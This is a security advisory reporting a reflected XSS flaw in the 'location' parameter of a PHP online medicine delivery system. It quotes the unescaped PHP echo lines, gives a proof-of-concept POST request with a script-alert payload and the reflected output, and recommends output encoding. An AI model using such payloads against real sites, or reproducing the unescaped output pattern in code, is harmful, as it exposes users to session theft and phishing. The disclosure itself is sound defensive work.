# itsourcecode Online Medicine Delivery System V1.0 - Reflected XSS via 'location' Parameter in '/index.php?q=orderdetails'
---

## 1. Product Information
| Field | Value |
| --- | --- |
| **Product Name** | Online Medicine Delivery System |
| **Product Link** | [https://itsourcecode.com/free-projects/php-project/complete-online-medicine-delivery-system-with-sms-notification-in-php/](https://itsourcecode.com/free-projects/php-project/complete-online-medicine-delivery-system-with-sms-notification-in-php/) |
| **Vendor** | itsourcecode |
| **Affected Version** | V1.0 |
| **Authentication Required** | Yes, requires Customer login session |


---

## 2. Vulnerability Type
**Reflected Cross-Site Scripting**

---

## 3. Vulnerability Description
The order details page `/index.php?q=orderdetails` of Online Medicine Delivery System contains a reflected XSS vulnerability. The page receives the `$_POST['location']` parameter and directly outputs it in 3 different HTML contexts without any HTML entity encoding (htmlspecialchars/htmlentities) processing:

1. **Echo inside HTML tags** (lines 122-123): Directly output within a `<span>` tag in the `Delivery Fee` area
2. **Echo inside HTML attributes** (line 119): Directly output within the `value` attribute of an `<input>` tag
3. **Echo after arithmetic operation** (lines 128-130): In the `Overall Price` area, the `location` value participates in arithmetic calculation before being output

The first echo point is the most direct XSS exploitation point, as the JavaScript code submitted by the attacker is directly parsed and executed by the browser.

**Affected Code**:

`customer/orderdetails.php:119` (echo inside HTML attribute)

```php
<input type="hidden" value="<?php echo $_POST['location']; ?>" name="PLACE">
```

`customer/orderdetails.php:122-123` (echo inside HTML tag)

```php
<div > Delivery Fee : &#8369 <span id="deliveryfee"><?php
if(isset($_POST['location'])){
    echo $_POST['location'];
}
```

`customer/orderdetails.php:128-130` (echo after arithmetic operation)

```php
<div> Overall Price : &#8369 <span><?php if(isset($_POST['location'])){
$total=  ($tot+$_POST['location']);
 echo $total;
```

---

## 4. Impact
+ **Cookie Theft/Session Hijacking**: An attacker can steal the victim's Session ID via `document.cookie`, taking over their account
+ **Phishing Attacks**: Can inject forged login forms to trick users into entering credentials

---

## 5. PoC
**PoC — Reflected XSS**:

```plain
POST /index.php?q=orderdetails HTTP/1.1
Host: ******
Cookie: PHPSESSID=<customer_session>
Content-Type: application/x-www-form-urlencoded
Connection: close

location=<script>alert(1)</script>

```

**Response**:

`<script>alert(1)</script>` is output verbatim in two locations within the page HTML:

```html
<!-- Echo point 1: Inside HTML tag -->
<span id="deliveryfee"><script>alert(1)</script></span>
<!-- Echo point 2: Inside HTML attribute -->
<input type="hidden" value="<script>alert(1)</script>" name="PLACE">
```

The browser popup displays `1`, confirming that the JavaScript code was successfully executed.

![image-20260716192911756](C:\Users\Shawn\AppData\Roaming\Typora\typora-user-images\image-20260716192911756.png)

## 6. Remediation
1. **Output Encoding**: All user data output to HTML must be entity-encoded using `htmlspecialchars()`
2. **Output Inside HTML Attributes**: Data output within HTML attributes must also be encoded, and attribute values should be enclosed in double quotes
3. **Input Validation**: The `location` parameter should be numeric

